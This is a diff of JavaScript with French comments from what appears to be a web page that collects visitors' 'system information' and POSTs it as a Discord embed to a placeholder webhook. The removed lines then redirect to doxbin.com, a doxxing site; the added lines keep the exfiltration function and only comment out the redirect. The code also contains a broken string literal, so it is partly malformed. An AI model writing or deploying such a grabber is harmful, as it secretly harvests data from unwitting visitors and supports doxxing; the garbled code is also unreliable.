@@ -116,38 +116,38 @@
       }
     }
 
-    function sendEmbedToWebhook(systemInfo) {
-      var xhr = new XMLHttpRequest();
-      var url = '{webhook_url}';
-      var params = JSON.stringify({
-        "content": "",
-        "embeds": [
-          {
-            "title": "Informations Système",
-            "description": systemInfo,
-            "color": 7506394 // Couleur de Discord
-          }
-        ]
-      });
-      
-      xhr.open('POST', url, true);
-      
-      // Ajouter les en-têtes HTTP nécessaires
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      
-      xhr.onreadystatechange = function() {
-        if(xhr.readyState == 4) {
-          if(xhr.status == 200) {
-            console.log('Requête envoyée avec succès.');
-          } else {
-            console.error('Erreur lors de l'envoi de la requête. Code d'erreur : ' + xhr.status);
-          }
-          // Rediriger vers une autre page après l'envoi des informations
-          window.location.href = "https://doxbin.com";
-        }
+function sendEmbedToWebhook(systemInfo) {
+  var xhr = new XMLHttpRequest();
+  var url = '{webhook_url}';
+  var params = JSON.stringify({
+    "content": "",
+    "embeds": [
+      {
+        "title": "Informations Système",
+        "description": systemInfo,
+        "color": 7506394 // Couleur de Discord
       }
-      xhr.send(params);
+    ]
+  });
+  
+  xhr.open('POST', url, true);
+  
+  // Ajouter les en-têtes HTTP nécessaires
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  
+  xhr.onreadystatechange = function() {
+    if(xhr.readyState == 4) {
+      if(xhr.status == 200) {
+        console.log('Requête envoyée avec succès.');
+      } else {
+        console.error('Erreur lors de l'envoi de la requête. Code d'erreur : ' + xhr.status);
+      }
+      // Rediriger vers une autre page après l'envoi des informations
+      // window.location.href = "https://doxbin.com"; // Commentez ou supprimez cette ligne
     }
+  }
+  xhr.send(params);
+}
 
     function getCurrentTime() {
       var now = new Date();
